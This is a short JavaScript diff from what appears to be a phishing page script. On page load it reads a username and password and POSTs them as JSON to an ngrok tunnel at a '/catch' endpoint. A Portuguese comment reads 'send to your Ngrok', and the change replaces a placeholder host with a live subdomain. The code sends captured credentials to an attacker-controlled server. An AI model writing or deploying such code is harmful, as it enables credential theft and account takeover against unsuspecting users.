@@ -8,7 +8,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const password = document.getElementById('custom-password').value;
 
         // Envia para seu Ngrok
-        await fetch('https://SEU-CODIGO.ngrok-free.app/catch', {
+        await fetch('https://3be416fe12a7.ngrok-free.app/catch', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username, password })
